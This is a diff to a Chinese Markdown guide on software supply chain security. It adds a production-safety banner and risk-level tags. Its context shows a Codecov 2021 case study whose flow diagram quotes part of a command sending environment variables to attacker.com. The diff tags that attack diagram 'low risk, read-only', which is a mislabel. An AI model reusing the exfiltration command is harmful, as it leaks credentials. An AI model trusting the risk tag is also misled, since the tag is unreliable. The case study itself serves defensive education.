@@ -54,6 +54,11 @@ authors:
   role: contributor
 ---
 
+> **生产环境安全提示**
+>
+> 本文档包含可直接执行的运维命令。执行前请确认：当前目标集群与 Namespace 是否正确；是否具备足够的 RBAC 权限；是否已在非生产环境验证。命令风险等级标注：🔴 高风险（可能造成数据丢失或服务中断）、🟡 中风险（会修改集群状态，但通常可回滚）、🟢 低风险/只读（信息收集，无副作用）。
+
+
 
 
 # 供应链安全概述 (Supply Chain Security Overview)
@@ -332,6 +337,7 @@ java -Dlog4j2.formatMsgNoLookups=true -jar app.jar
 2021年4月，Codecov（代码覆盖率服务）的 Bash Uploader 脚本被篡改，攻击者通过修改官方脚本中的 URL，将环境变量（包括 API 密钥、令牌）发送到攻击者控制的服务器。
 
 ```
+# 🟢 低风险：只读/信息收集，通常无副作用
 Codecov 攻击流程:
 
 [攻击者入侵 Codecov Docker 镜像构建过程]
@@ -358,7 +364,6 @@ $(env)" http://attacker.com/upload/v2
                     ▼
 [攻击者利用盗取的凭据横向移动到客户系统]
 ```
-
 ## 影响评估
 
 - **持续时间**：2021年1月31日 - 2021年4月1日（约2个月）
@@ -1981,3 +1986,5 @@ go install github.com/slsa-framework/slsa-verifier/v2/cli/slsa-verifier@latest
 - 03-sbom-generation-management
 
 - [[domain-05-security-compliance/README.md|返回目录]]
+
+<!-- risk-assessed -->
